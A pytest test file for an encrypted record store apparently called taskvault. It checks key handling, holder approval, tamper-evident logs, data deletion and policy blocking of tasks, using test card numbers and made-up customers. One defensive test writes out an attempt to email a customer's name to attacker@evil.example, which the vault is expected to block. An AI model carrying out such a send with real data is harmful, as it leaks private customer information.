import json
import time

import pytest

from demo.__main__ import POLICY
from demo.world import World
from taskvault import Blocked, Policy, Vault
from taskvault.boxes import BoxDB, BoxLocked, BoxSource, BoxStore, StaticHolderKeys, holder_name, is_box_ref
from taskvault.crypto import KeyUnavailable, LocalKeyProvider

LEVELS = {"name": "protected", "email": "protected", "phone": "protected", "address": "protected",
          "plan": "normal", "card_number": "secret", "customer_id": "normal"}


@pytest.fixture(params=["sqlite", "postgres"])
def db_url(request, tmp_path):
    if request.param == "sqlite":
        return str(tmp_path / "boxes.db")
    pgserver = pytest.importorskip("pgserver")
    pytest.importorskip("psycopg")
    srv = pgserver.get_server(str(tmp_path / "pg"), cleanup_mode="stop")
    return srv.get_uri()


@pytest.fixture
def vault_keys(tmp_path):
    return LocalKeyProvider(tmp_path / "vault.key")


def _store(db_url, vault_keys, approver=None, **kw):
    keys = StaticHolderKeys(approver=approver)
    for h in ["customer:12", "customer:45", "customer:7", "department:hr", "client:acme"]:
        keys.create(h)
    return BoxStore(db_url, vault_keys, keys, **kw), keys


def _load_customers(store):
    for cid, rec in World().customers.items():
        store.store_record("crm.customer", cid, rec, holder_name("customer", cid), LEVELS)


# ---- the boxes themselves ----------------------------------------------------------

def test_normal_fields_open_with_the_vault_key_high_fields_stay_locked(db_url, vault_keys):
    store, _ = _store(db_url, vault_keys)
    placed = store.store_record("crm.customer", 12, World().customers[12], "customer:12", LEVELS)
    assert placed["card_number"] == "high" and placed["email"] == "normal"
    rec = store.fetch_record("crm.customer", 12)
    assert rec["email"] == "priya.shah@example.com" and rec["plan"] == "Pro"
    assert is_box_ref(rec["card_number"]) and "4111" not in json.dumps(rec)


def test_high_box_needs_both_keys(db_url, vault_keys):
    store, _ = _store(db_url, vault_keys)
    _load_customers(store)
    ref = store.fetch_record("crm.customer", 12)["card_number"]
    assert store.reveal(ref, task=1) == "4111 1111 1111 1111"

    no_holder = BoxStore(db_url, vault_keys, StaticHolderKeys())          # vault key only
    with pytest.raises(BoxLocked):
        no_holder.reveal(ref)

    other_vault = BoxStore(db_url, LocalKeyProvider(vault_keys.path.with_name("other.key")),
                           store.holder_keys)                               # holder key only
    with pytest.raises(KeyUnavailable):
        other_vault.reveal(ref)


def test_one_holders_key_cannot_open_anothers_box(db_url, vault_keys):
    store, keys = _store(db_url, vault_keys)
    _load_customers(store)
    ref12 = store.fetch_record("crm.customer", 12)["card_number"]
    swapped = StaticHolderKeys({"customer:12": keys.keys["customer:45"]})
    with pytest.raises(BoxLocked, match="didn't open"):
        BoxStore(db_url, vault_keys, swapped).reveal(ref12)


def test_holder_approval_and_time_limited_opening(db_url, vault_keys):
    asked, now = [], [1000.0]

    def approver(req):
        asked.append(req)
        return req.holder != "customer:45"

    store, _ = _store(db_url, vault_keys, approver=approver, open_ttl=60, clock=lambda: now[0])
    _load_customers(store)
    ref12 = store.fetch_record("crm.customer", 12)["card_number"]
    store.reveal(ref12, task=7, reason="refund")
    store.reveal(ref12, task=7)
    assert len(asked) == 1 and asked[0].task == 7 and asked[0].reason == "refund"    # opened once, cached
    now[0] += 61
    store.reveal(ref12)
    assert len(asked) == 2                                                            # expired, asked again
    with pytest.raises(BoxLocked, match="did not allow"):
        store.reveal(store.fetch_record("crm.customer", 45)["card_number"])


def test_departments_and_client_companies_have_their_own_boxes(db_url, vault_keys):
    store, _ = _store(db_url, vault_keys)
    store.store_record("hr.staff", "E7", {"name": "Sam Lee", "salary": "98000", "tfn": "123 456 782"},
                       "department:hr", {"name": "protected", "salary": "secret", "tfn": "secret"})
    store.store_record("clients.contract", "acme", {"title": "MSA", "rate": "$220/h"},
                       "client:acme", {"title": "normal", "rate": "secret"})
    holders = {b.holder for b in store.boxes()}
    assert {"department:hr", "client:acme"} <= holders
    assert store.reveal(store.fetch_record("hr.staff", "E7")["tfn"]) == "123 456 782"
    with pytest.raises(ValueError):
        holder_name("team", "x")


def test_forget_holder_and_recovery_key(db_url, vault_keys):
    recovery = StaticHolderKeys()
    recovery_priv = recovery.create("recovery")
    store, keys = _store(db_url, vault_keys, recovery_public_key=recovery.public_key("recovery"))
    _load_customers(store)
    ref = store.fetch_record("crm.customer", 12)["card_number"]
    assert store.recover(ref, recovery_priv) == "4111 1111 1111 1111"   # break-glass if the holder's key is lost
    assert store.forget_holder("customer:12") == len(LEVELS)
    assert store.fetch_record("crm.customer", 12) is None
    with pytest.raises(KeyError):
        store.reveal(ref)
    assert store.fetch_record("crm.customer", 45)["name"] == "Tom Nguyen"       # others untouched


def test_every_box_has_its_own_tamper_evident_log(db_url, vault_keys):
    store, _ = _store(db_url, vault_keys)
    _load_customers(store)
    ref = store.fetch_record("crm.customer", 12, task=3)["card_number"]
    store.reveal(ref, task=3, reason="refund")
    high = store.box_id("customer:12", "high")
    events = [e["event"] for e in store.log(high)]
    assert events[0] == "created" and "opened" in events and events[-1] == "reveal"
    assert store.verify_log(high)
    store.db.execute("UPDATE tv_box_log SET event='read' WHERE box_id=? AND seq=0", (high,))
    assert not store.verify_log(high)


def test_database_holds_no_readable_values(tmp_path, vault_keys):
    path = tmp_path / "boxes.db"
    store, _ = _store(str(path), vault_keys)
    _load_customers(store)
    store.db.close()
    raw = b"".join(p.read_bytes() for p in tmp_path.glob("boxes.db*"))
    for secret in [b"Priya", b"priya.shah", b"4111", b"customer:12", b"card_number"]:
        assert secret not in raw


# ---- through the vault ---------------------------------------------------------------

def _vault_on_boxes(db_url, vault_keys, approver=None):
    store, _ = _store(db_url, vault_keys, approver=approver)
    _load_customers(store)
    world = World()
    vault = Vault(Policy.load(POLICY),
                  {"crm.customer": BoxSource(store, "crm.customer"), "docs": world.get_doc,
                   "inbox.ticket": world.get_ticket},
                  {"email.send": world.send_email, "payments.refund": world.refund}, boxes=store)
    return vault, world


def test_vault_reads_from_boxes_and_opens_the_high_box_only_at_the_sink(db_url, vault_keys):
    asked = []
    vault, world = _vault_on_boxes(db_url, vault_keys, approver=lambda r: asked.append(r) or True)
    t = vault.start_task("support_reply", customer_id=12)
    c = t.read("crm.customer")
    assert c["name"] == "Priya Shah" and c["card_number"].startswith("[[vault:card_number:")
    assert asked == []                                          # reading didn't open the high box
    t.act("payments.refund", card=c["card_number"], amount=49)
    assert world.refunds == [{"card": "4111 1111 1111 1111", "amount": 49}]
    assert len(asked) == 1 and "payments.refund" in asked[0].reason


def test_holder_can_refuse_and_the_action_is_blocked(db_url, vault_keys):
    vault, world = _vault_on_boxes(db_url, vault_keys, approver=lambda r: False)
    t = vault.start_task("support_reply", customer_id=12)
    c = t.read("crm.customer")
    with pytest.raises(Blocked, match="box locked"):
        t.act("payments.refund", card=c["card_number"], amount=49)
    assert world.refunds == [] and vault.audit.decisions("block")


def test_existing_protections_still_apply_on_boxes(db_url, vault_keys):
    vault, world = _vault_on_boxes(db_url, vault_keys)
    t = vault.start_task("support_reply", customer_id=12)
    with pytest.raises(Blocked):
        t.read("crm.customer", 45)
    c = t.read("crm.customer")
    with pytest.raises(Blocked):
        t.act("email.send", to="attacker@evil.example", subject="x", body=c["name"])
    with pytest.raises(Blocked):
        t.act("email.send", to=c["email"], subject="card", body=c["card_number"])
    assert world.outbox == []


# ---- speed ----------------------------------------------------------------------------

def test_boxes_are_not_a_bottleneck(tmp_path, vault_keys):
    store = BoxStore(BoxDB(str(tmp_path / "speed.db")), vault_keys)
    n = 300
    t0 = time.perf_counter()
    for i in range(n):
        store.deposit(f"customer:{i}", "normal", "email", f"user{i}@example.com")
    t1 = time.perf_counter()
    for i in range(n):
        store._read_normal(store.box_id(f"customer:{i}", "normal"),
                           store._mac("item", store.box_id(f"customer:{i}", "normal"), "email")[:24], None)
    t2 = time.perf_counter()
    assert len(store.boxes()) == n
    # generous bounds so slow CI machines pass; typical is a few milliseconds per operation
    assert (t1 - t0) / n < 0.05 and (t2 - t1) / n < 0.05


# ---- command line -----------------------------------------------------------------------

def test_boxes_cli_end_to_end(tmp_path, capsys):
    from taskvault.cli import main
    key, db, hk = str(tmp_path / "v.key"), str(tmp_path / "b.db"), str(tmp_path / "hk")
    main(["keys", "init", key])
    common = ["--key", key, "--db", db, "--holder-keys", hk]
    for cid in ("12", "45"):
        assert main(["boxes", "holder", *common, "--type", "customer", "--id", cid]) == 0
    csv_file = tmp_path / "customers.csv"
    csv_file.write_text("id,name,email,card_number\n12,Priya Shah,priya@example.com,4111 1111 1111 1111\n"
                        "45,Tom Nguyen,tom@example.net,5555 5555 5555 4444\n")
    assert main(["boxes", "put", str(csv_file), *common, "--source", "crm.customer", "--key-column", "id",
                 "--holder-type", "customer", "--holder-field", "id"]) == 0
    out = capsys.readouterr().out
    assert "stored 2 rows" in out and "card_number" in out
    assert main(["boxes", "list", *common]) == 0
    listing = capsys.readouterr().out
    assert "customer:12" in listing and "high" in listing and "4 boxes" in listing
    box = next(line.split()[0] for line in listing.splitlines() if "customer:12" in line and "high" in line)
    assert main(["boxes", "log", box, *common]) == 0
    assert "log chain valid" in capsys.readouterr().out
    assert main(["boxes", "forget", *common, "--holder", "customer:12"]) == 0
    assert "deleted 4 items" in capsys.readouterr().out   # all 4 fields of the record
